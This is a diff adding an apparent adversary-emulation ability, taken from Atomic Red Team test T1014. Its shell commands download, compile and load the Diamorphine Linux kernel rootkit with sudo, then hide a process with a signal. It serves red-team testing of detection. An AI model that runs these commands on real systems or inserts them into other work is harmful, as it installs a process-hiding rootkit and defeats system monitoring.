@@ -1,0 +1,66 @@
+- id: 0b996469-48c6-46e2-8155-a17f8b6c2247
+  name: Loadable Kernel Module based Rootkit (Diamorphine)
+  description: Loads Diamorphine kernel module, which hides itself and a processes.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1014
+    name: Rootkit
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -f /lib/modules/$(uname -r)/diamorphine.ko ]; then : ; else
+          mkdir -p /tmp/atomic && cd /tmp/atomic; curl -sLO https://github.com/m0nad/Diamorphine//archive/898810523aa2033f582a4a5903ffe453334044f9.zip
+          && unzip 898810523aa2033f582a4a5903ffe453334044f9.zip && cd Diamorphine-898810523aa2033f582a4a5903ffe453334044f9;
+          make; sudo cp diamorphine.ko /lib/modules/$(uname -r)/; sudo depmod -a;
+          fi; sudo modprobe diamorphine; ping -c 10 localhost >/dev/null & TARGETPID="$!";
+          ps $TARGETPID; kill -31 $TARGETPID; ps $TARGETPID || echo "process ${TARGETPID}
+          hidden"'
+        cleanup: 'kill -63 1; sudo modprobe -r #{rootkit_name}; sudo rm -rf /lib/modules/$(uname
+          -r)/#{rootkit_name}.ko /tmp/atomic; sudo depmod -a'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - defense-evasion
+  - atomic-red-team
+  - t1014
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      repo:
+        description: Url of the diamorphine github repo
+        type: string
+        default: https://github.com/m0nad/Diamorphine/
+      rev:
+        description: Revision of the github repo zip
+        type: string
+        default: 898810523aa2033f582a4a5903ffe453334044f9
+      rootkit_name:
+        description: Module name
+        type: string
+        default: diamorphine
+    dependencies:
+    - description: 'The kernel module must exist on disk at specified location (#{rootkit_name}.ko)
+
+        '
+      prereq_command: 'if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then
+        exit 0; else exit 1; fi;
+
+        '
+      get_prereq_command: 'mkdir -p /tmp/atomic && cd /tmp/atomic
+
+        curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
+
+        make
+
+        sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
+
+        sudo depmod -a
+
+        '
+    technique_created: '2017-05-31T21:30:26.496Z'
+    atomic_guid: 0b996469-48c6-46e2-8155-a17f8b6c2247
+    import_timestamp: '2025-06-24T11:15:55.413458Z'
